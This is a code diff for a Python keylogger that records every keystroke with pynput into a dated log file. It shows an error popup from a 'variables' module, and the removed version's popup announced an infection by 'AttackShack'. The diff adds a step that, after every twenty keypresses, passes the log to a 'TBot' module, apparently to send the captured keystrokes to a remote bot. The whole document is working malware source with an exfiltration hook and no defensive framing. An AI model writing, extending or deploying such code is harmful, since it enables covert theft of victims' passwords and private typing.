@@ -1,32 +1,31 @@
-import pynput
-from tkinter import messagebox
+import datetime
 from pynput.keyboard import Key, Listener
+from tkinter import messagebox
+import TBot as TB
+import variables as v
 
-count = 0
+global fp
 keys = []
+path = v.LogDir
+date = datetime.date.today()
+DocName = str(date) + ".txt"
+fp = path+DocName
+count = 0
 
 
-def pantallazo():
-    messagebox.showerror(
-        "Sistema", "Usted ha sido infectado por un Keylogger desarrollado por AttackShack")
+def message():
+    messagebox.showerror("System", v.tbmsg)
 
 
 def writefile(keys):
-    with open("log.txt", "w") as f:
+    with open(fp, v.logFuncMode) as f:
         for key in keys:
             k = key.replace("'", "")
             if k.find("space") > 0:
                 f.write(' ')
             elif k.find("enter") > 0:
                 f.write('\n')
-            elif k.find("return") > 0:
-                f.write('-bs-')
-            elif k.find("tab    ") > 0:
-                f.write('\t')
             elif k.find("Key") == -1:
-                f.write(k)
-            else:
-                f.write("\n")
                 f.write(k)
 
 
@@ -35,8 +34,11 @@ def onPress(key):
 
     keys.append(f"{key}")
     count += 1
-    print("{0} pressed". format(key))
+    print(f"{key} pressed")
     writefile(keys)
+    if count > 20:
+        TB.getID(fp)
+        count = 0
 
 
 def onRelease(key):
@@ -44,6 +46,10 @@ def onRelease(key):
         return False
 
 
-pantallazo()
-with Listener(on_press=onPress, on_release=onRelease) as listener:
-    listener.join()
+def run():
+    with Listener(on_press=onPress, on_release=onRelease) as listener:
+        listener.join()
+
+
+message()
+run()
